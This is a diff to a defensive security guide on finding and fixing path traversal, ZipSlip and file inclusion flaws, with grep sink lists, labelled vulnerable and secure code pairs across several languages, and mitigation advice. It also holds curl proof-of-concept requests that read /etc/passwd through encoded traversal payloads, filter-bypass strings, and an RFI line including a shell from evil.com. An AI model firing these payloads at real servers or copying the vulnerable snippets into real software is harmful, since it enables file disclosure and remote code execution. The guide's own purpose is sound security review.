@@ -7,6 +7,25 @@ description: Path traversal and file inclusion testing for local/remote file acc
 
 Flawed file path handling and dynamic file inclusion give attackers a route to sensitive configuration, source code, credentials, SSRF pivots, and server-side code execution. Any user-influenced path, filename, or scheme must be treated as untrusted, normalized to a canonical form, and constrained to an explicit allowlist — or user control over the path should be eliminated entirely.
 
+The core pattern: *unvalidated user input reaches a filesystem operation and the resolved path is not verified to remain within the intended base directory.*
+
+## What It Is (and Is Not)
+
+**Path traversal IS**
+- User-supplied filename/path joined to a base directory without canonicalization + containment check: `open(os.path.join(BASE, user_filename))`
+- File reads/serves driven by URL params: `fs.readFile(path.join(__dirname, req.query.file))`
+- Include directives with user input: `include($_GET['page'] . '.php')`
+- Archive extraction using entry names as output paths without stripping `../` (ZipSlip)
+- `send_file()` / `res.sendFile()` with unsanitized user-controlled path components
+- Paths derived from DB values originally stored from user input (second-order)
+
+**Path traversal is NOT**
+- **SSRF**: fetching a remote URL from user input — separate class
+- **RCE via arbitrary file write** or **unrestricted file upload**: related impact classes; tag separately
+- **Static file serving**: fully hardcoded paths with no user influence
+- **LFI/RFI alone**: when the sink is `include`/`require` executing code, prefer LFI/RFI tags (see below); path traversal applies when the primitive is read/write/serve without execution
+- **Effective mitigation already applied**: `realpath`/`resolve` + base-directory prefix check, strict filename allowlist, or `basename()` before join (see Safe Patterns)
+
 ## Where to Look
 
 **Path Traversal**
@@ -55,6 +74,22 @@ Flawed file path handling and dynamic file inclusion give attackers a route to s
 - Normalization tests: `..../`, `..\\`, `././`, trailing dot/double dot segments; repeated decoding
 - Absolute path acceptance: `/etc/passwd`, `C:\Windows\System32\drivers\etc\hosts`
 - Server mismatch: `/static/..;/../etc/passwd` ("..;"), encoded slashes (`%2F`), double-decoding via upstream
+
+### Code Sink Patterns (grep)
+
+Flag file operations where the path argument is dynamic (variable, not a fully hardcoded literal):
+
+- **Python**: `open(`, `os.path.join(`, `pathlib.Path(`, `.read_text(`, `.read_bytes(`, `send_file(`, `FileResponse(`
+- **Node.js**: `fs.readFile`, `fs.readFileSync`, `fs.createReadStream`, `path.join(`, `path.resolve(`, `res.sendFile`, `res.download`
+- **PHP**: `file_get_contents(`, `fopen(`, `readfile(`, `include(`, `require(`, `include_once(`, `require_once(`
+- **Ruby**: `File.read(`, `File.open(`, `IO.read(`, `send_file `
+- **Java**: `new File(`, `new FileInputStream(`, `Files.readAllBytes(`, `Paths.get(`, `UrlResource(`
+- **Go**: `os.Open(`, `os.ReadFile(`, `filepath.Join(`, `http.ServeFile(`
+- **C#**: `File.ReadAllText(`, `File.ReadAllBytes(`, `new FileStream(`, `Path.Combine(`
+- **Path construction joins**: `os.path.join(BASE, var)`, `path.join(__dirname, var)`, `Paths.get(base).resolve(var)`, string concat `` `${base}/${var}` ``
+- **Archive extraction**: `zipfile.ZipFile.extractall`, `tarfile.extractall`, `ZipEntry.getName()` as output path, Node `adm-zip`/`node-tar` extract calls
+
+Skip: fully hardcoded paths, config/env-only paths with no user component, fixed-root static middleware (e.g. `express.static('public')`).
 
 ## How to Detect
 
@@ -148,6 +183,21 @@ Flawed file path handling and dynamic file inclusion give attackers a route to s
 - Verify symlink handling and path canonicalization prior to write
 - Impact: overwrite config/templates or drop webshells into served directories
 
+```python
+# VULNERABLE — entry names used as output paths without validation
+with zipfile.ZipFile(user_zip) as zf:
+    zf.extractall('/var/www/uploads')
+
+# SECURE — validate each entry before extract
+base = os.path.realpath('/var/www/uploads')
+with zipfile.ZipFile(user_zip) as zf:
+    for member in zf.namelist():
+        target = os.path.realpath(os.path.join(base, member))
+        if not target.startswith(base + os.sep):
+            raise ValueError(f"ZipSlip detected: {member}")
+    zf.extractall(base)
+```
+
 ## Analysis Workflow
 
 1. **Inventory file operations** - Downloads, previews, templates, logs, exports/imports, report engines, uploads, archive extractors
@@ -157,6 +207,22 @@ Flawed file path handling and dynamic file inclusion give attackers a route to s
 5. **Escalate** - From disclosure (read) to influence (write/extract/include), then to execution (wrapper/engine chains)
 
 ## Confirming a Finding
+
+### Dynamic Test / PoC
+
+Minimal runtime check once a sink is identified:
+
+```bash
+# Baseline in-root control
+curl -s 'https://target/download?file=report.pdf' | head -c 200
+
+# Traversal — expect out-of-root file content or path-disclosure error
+curl -s 'https://target/download?file=../../../etc/hosts'
+curl -s 'https://target/download?file=..%2f..%2f..%2fetc%2fhosts'
+curl -s 'https://target/download?file=%252e%252e%252fetc%252fpasswd'  # double-encoded
+```
+
+**Expected signal**: response body matches known file content (e.g. `127.0.0.1`), `Content-Disposition` filename mismatch, or error echoing canonicalized path. If partial mitigation exists (`replace('../')`), retry `....//`, mixed separators (`..%5c`), and absolute paths (`/etc/passwd`).
 
 1. Show a minimal traversal read proving out-of-root access (e.g., `/etc/hosts`) with a same-endpoint in-root control
 2. For LFI, demonstrate inclusion of a benign local file or harmless wrapper output (`php://filter` base64 of index.php)
@@ -170,6 +236,51 @@ Flawed file path handling and dynamic file inclusion give attackers a route to s
 - Canonicalized paths constrained to an allowlist/root after normalization
 - Wrappers disabled and includes using constant templates only
 - Archive extractors that sanitize paths and enforce destination directories
+
+## Safe Patterns (and Weak Mitigations)
+
+Apply **before** the file operation:
+
+**1. Canonical path + base-directory prefix check (preferred)**
+```python
+BASE = '/var/www/files'
+safe_path = os.path.realpath(os.path.join(BASE, user_input))
+if not safe_path.startswith(BASE + os.sep):
+    raise PermissionError("Path escape detected")
+```
+
+```javascript
+const base = path.resolve('/var/www/files');
+const resolved = path.resolve(base, req.query.file);
+if (!resolved.startsWith(base + path.sep)) return res.status(403).send('Forbidden');
+```
+
+**2. `basename()` / filename-only** — strips directory components; prevents traversal but blocks subdirectories
+```php
+readfile('/var/www/uploads/' . basename($_GET['file']));
+```
+
+**3. Strict allowlist** — compare input against fixed permitted names before any join
+```python
+ALLOWED = {'report.pdf', 'manual.txt'}
+if user_input not in ALLOWED: abort(400)
+```
+
+**4. Indirection map** — map opaque IDs to server-side filenames; never expose raw paths
+```python
+FILE_MAP = {'1': 'report.pdf', '2': 'manual.txt'}
+filename = FILE_MAP.get(user_id)
+```
+
+**5. Framework safe helpers** — Flask `send_from_directory(fixed_base, filename)` validates containment via `safe_join` (do not flag unless the *base* is also user-controlled)
+
+**Insufficient (do not treat as safe)**
+- `str.replace('../', '')` — bypass via `....//`, encoding, backslashes
+- Rejecting paths starting with `/` only — relative `../` still escapes
+- `os.path.join` / `path.join` alone — `join('/base', '../etc/passwd')` → `/etc/passwd`
+- Single URL-decode — double-encoding (`%252e%252e%252f`) survives
+- Extension-only checks without containment — `../../etc/passwd%00.pdf` on legacy systems
+- Prefix check without trailing separator — `startswith('/var/www')` matches `/var/www-evil`
 
 ## Business Risk
 
@@ -228,9 +339,22 @@ Some vulnerabilities involve both path traversal AND local file inclusion:
 
 ### Python
 - **VULN**: `open(user_input)`, `open(os.path.join(base, user_input))` — no realpath validation
-- **VULN**: `send_file(user_input)`, `send_from_directory(base, user_input)` — Flask file serving with user-controlled path
+- **VULN**: `send_file(filepath)` where `filepath` is user-influenced without realpath + prefix check
+- **SAFE**: `send_from_directory(fixed_base, filename)` — Flask `safe_join` blocks traversal when base is server-controlled
 - **SAFE**: `base = os.path.realpath(base); safe_path = os.path.realpath(os.path.join(base, user_input)); assert os.path.commonpath([base, safe_path]) == base`
 - **Pattern**: `../` in `user_input` traverses out of the intended directory
+
+```python
+# VULNERABLE — FastAPI path param used directly
+@app.get('/file/{name}')
+async def get_file(name: str):
+    return FileResponse(f'/app/static/{name}')
+
+# SECURE — basename strips traversal sequences
+@app.get('/file/{name}')
+async def get_file(name: str):
+    return FileResponse(os.path.join('/app/static', os.path.basename(name)))
+```
 
 ### JavaScript (Node.js)
 - **VULN**: `fs.readFile(req.params.filename, ...)` — no path validation
@@ -243,6 +367,37 @@ Some vulnerabilities involve both path traversal AND local file inclusion:
 - **VULN**: `file_get_contents($_GET['file'])`, `readfile($_GET['path'])`
 - **SAFE**: `include(basename($_GET['page']) . '.php')` — reduces but does not eliminate risk
 - **RFI**: When `allow_url_include=On`, `include('http://evil.com/shell.php')` achieves RCE
+
+### Ruby
+
+```ruby
+# VULNERABLE — params[:file] joined without validation
+def show
+  send_file Rails.root.join('public', 'reports', params[:file])
+end
+
+# SECURE — basename only
+def show
+  send_file Rails.root.join('public', 'reports', File.basename(params[:file]))
+end
+```
+
+### Go
+
+```go
+// VULNERABLE — query param joined directly
+http.ServeFile(w, r, filepath.Join("/var/www/files", r.URL.Query().Get("file")))
+
+// SECURE — Clean + prefix check
+name := r.URL.Query().Get("file")
+base := "/var/www/files"
+clean := filepath.Join(base, filepath.Clean("/"+name))
+if !strings.HasPrefix(clean, base+string(os.PathSeparator)) {
+    http.Error(w, "Forbidden", http.StatusForbidden)
+    return
+}
+http.ServeFile(w, r, clean)
+```
 
 ## Java Servlet Patterns (CWE-22)
 
